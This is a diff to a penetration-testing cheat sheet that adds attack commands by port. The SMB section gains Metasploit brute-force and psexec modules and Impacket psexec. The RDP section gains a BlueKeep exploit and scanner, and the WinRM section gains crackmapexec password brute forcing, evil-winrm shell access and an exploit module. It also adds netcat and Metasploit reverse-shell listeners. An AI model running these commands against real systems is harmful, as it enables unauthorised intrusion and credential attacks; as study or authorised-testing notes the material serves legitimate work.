@@ -463,6 +463,19 @@ nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrat
 The `IPC$` share is also known as a null session connection. By using this session, Windows lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares.
 
 
+**Metasploit**
+```
+msf6> use auxiliary/scanner/smb/smb_login  # to bruteforce
+msf6> use exploit/windows/smb/psexec       # to run commands
+```
+
+ImPacket
+```
+psexec.py Administrator@192.168.0.2 cmd.exe
+```
+
+
+
 
 ### HTTPS (Port 443)
 
@@ -484,11 +497,34 @@ Must check the SSL certificate and look into sections like the `Subject Alt Name
 ### RDP (Port 3389)
 
 BlueKeep RCE [CVE-2019-0708]
+
 ```
+msf > use auxiliary/scanner/rdp/rdp_scanner
 msf > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
 ```
 
+```
+xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:10.10.10.1:3389
+```
 
+
+### WinRM (Port 5985 / 5986 over SSL)
+
+You can use `crackmapexec` to attack {rdp,ssh,mssql,ftp,ldap,winrm,smb} protocols.
+
+```
+crackmapexec winrm -u administrator -p /usr/share/wordlists/metasploit/unix_passwords.txt --port 5985  $TG
+crackmapexec winrm -u <USERNAME> -p <PASSWORD> -x "systeminfo" --port 5985  $TG
+```
+
+Use `evil-winrm.rb` for shell
+```
+evil-winrm -i 10.5.27.227 -u administrator -p tinkerbell
+```
+
+```
+msf6> use exploit/windows/winrm/winrm_script_exec
+```
 
 
 #### Bruteforcing with Hydra
@@ -591,6 +627,16 @@ portfwd add –l 3389 –p 3389 –r 172.16.194.191
 portfwd delete –l 3389 –p 3389 –r 172.16.194.191
 ```
 
+
+
+Netcat listener on port 4444.
+```
+nc -nvlp 4444
+```
+Metasploit listener
+```
+use exploit/multi/handler
+```
 
 #### Shell Stabilization
 
